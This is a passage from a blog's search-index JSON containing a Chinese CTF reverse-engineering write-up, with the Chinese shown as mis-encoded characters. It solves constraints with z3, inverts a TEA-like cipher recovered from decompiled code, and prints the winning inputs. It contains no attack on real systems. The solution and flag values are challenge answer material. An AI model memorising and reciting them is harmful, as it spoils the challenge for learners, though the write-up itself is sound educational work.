from z3 import * a = Int('a') b = Int('b') c = Int('c') d = Int('d') e = Int('e') f = Int('f') s = Solver() s.add(a == 0xDF48EF7E) s.add(b == 0x20CAACF4) s.add(f == 0x84F30420) s.add(c-d == 0x84A236FF) s.add(d+e == 0xFA6CB703) s.add(c-e == 0x42D731A8) print(s.check()) print(s.model()) a-fè¡¨ç¤ºa1çš„0-5ï¼Œz3é‡Œä¸ä¼šå®šä¹‰æ•°ç»„ï¼Œå¹²è„†ç”¨å­—æ¯ï¼Œä¼šçš„ä½¬æ•™ä¸€ä¸‹å­©å­ å¾—åˆ°ç»“æœ sat [c = 3774025685, d = 1548802262, e = 2652626477, f = 2230518816, b = 550153460, a = 3746099070] ä½†è¿™è¿˜æ²¡å®Œï¼ˆè¦æ˜¯å…‰è§£æ–¹ç¨‹å¯èƒ½ä¹Ÿåšä¸äº†ç¬¬ä¸‰é¢˜ è§£å‡ºæ¥çš„æ˜¯åŠ å¯†åçš„inputï¼ŒåŠ å¯†ç®—æ³•å¦‚ä¸‹ for ( j = 0; j \u003c= 2; ++j ) { dword_601078 = v6[j]; dword_60107C = HIDWORD(v6[j]); sub_400686(\u0026dword_601078, \u0026unk_601060); LODWORD(v7[j]) = dword_601078; HIDWORD(v7[j]) = dword_60107C; } åŸºæœ¬æ˜¯æŠŠé«˜å››å­—èŠ‚ï¼ˆHIDWORDï¼‰å’Œä½å››å­—èŠ‚ï¼ˆLODWORDï¼‰åˆ†å¼€ä¸€é¡¿æ“ä½œï¼Œè¿›å‡½æ•°sub_400686 __int64 __fastcall sub_400686(unsigned int *a1, _DWORD *a2) { __int64 result; // rax unsigned int v3; // [rsp+1Ch] [rbp-24h] unsigned int v4; // [rsp+20h] [rbp-20h] int v5; // [rsp+24h] [rbp-1Ch] unsigned int i; // [rsp+28h] [rbp-18h] v3 = *a1; v4 = a1[1]; v5 = 0; for ( i = 0; i \u003c= 0x3F; ++i ) { v5 += 0x458BCD42; v3 += (v4 + v5 + 11) ^ ((v4 \u003c\u003c 6) + *a2) ^ ((v4 \u003e\u003e 9) + a2[1]) ^ 0x20; v4 += (v3 + v5 + 20) ^ ((v3 \u003c\u003c 6) + a2[2]) ^ ((v3 \u003e\u003e 9) + a2[3]) ^ 0x10; } *a1 = v3; result = v4; a1[1] = v4; return result; } æ„Ÿè§‰å¥½åƒæˆ‘çš„äºŒé¢é¢˜ï¼ŒteaåŠ å¯†ï¼Ÿ å˜é‡åªæœ‰v3ï¼Œv4ï¼Œä¸”æ±‚v3æ—¶v4å·²çŸ¥ï¼Œæ±‚v4æ—¶v3å·²çŸ¥ ç»“è®ºï¼šå¯é€†ï¼Œéš¾ç‚¹åœ¨äºå„ç§æ•°æ®ç±»å‹å®¹æ˜“æŠŠè‡ªå·±ææ™• æ³¨æ„ä¸»å‡½æ•°inputæ ¼å¼æ§åˆ¶ä¸º%dï¼Œæ•…ç”¨intå­˜flag __isoc99_scanf(\"%d\", (char *)v6 + 4 * i); å®Œæ•´ä»£ç  #include\u003ccstdio\u003e unsigned int flag[100],a1[]={3746099070,550153460,3774025685,1548802262,2652626477,2230518816}; unsigned long long a2[10]; unsigned int key[5]={2,2,3,4}; int v5; int main(){ for(int i=0;i\u003c3;i++){ a2[i]=*((unsigned long long*)a1+i); } for(int i=0;i\u003c3;i++){ unsigned int xl=*((unsigned int*)\u0026a2[i]);//ä½ä½ unsigned int xh=*((unsigned int*)\u0026a2[i]+1);//é«˜ä½ for(int j=0x3F;j\u003e=0;j--){ v5=(j+1)*0x458BCD42; xh-=(xl+v5+20)^((xl\u003c\u003c6)+key[2])^((xl\u003e\u003e9)+key[3])^0x10; xl-=(xh+v5+11)^((xh\u003c\u003c6)+key[0])^((xh\u003e\u003e9)+key[1])^0x20; } flag[2*i]=xl; flag[2*i+1]=xh; } for(int i=0;i\u003c6;i++){ printf(\"%d\\n\",flag[i]); } } è¾“å‡º6ä¸ªæ•°å­— 6712417 6781810 6643561 7561063 7497057 7610749 å› Ubuntu input dx3906@ubuntu:~/Desktop$ '/home/dx3906/attachment' Let us play a game? you have six chances to input Come on! input: 6712417 input: 6781810 input: 6643561 input: 7561063 input: 7497057 input: 7610749 good! Congratulation! You seccess half Do not forget to change input to hex and combine~ ByeB","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:21:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":null,"content":"About ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Hi there ğŸ‘‹ This is DX3906 A student from Xidian University, major in Cyberspace Security. CTFer(mainly Reverse Engineering) in XDSEC/L-team. Learning: binary security \u0026 web developing \u0026 Devops Blog: DX3906â€™s blog email: dx390611@gmail.com github: https://github.com/DX39061 ","date":"0001-01-01","objectID":"/about/:0:1","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"å¾è¾ˆæ‰€èµ´ï¼Œæ˜¯ä¸ºæ˜Ÿè¾°å¤§æµ· ","date":"0001-01-01","objectID":"/about/:0:2","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Friends æ¬¢è¿ç•™è¨€äº¤æ¢å‹é“¾ï¼ Reverier-Xu äº‘ä¹‹å› track æœæœ å«æ ‘ d33b4t0 Frank P.Z. shallow ","date":"0001-01-01","objectID":"/links/:0:0","tags":null,"title":"","uri":"/links/"}]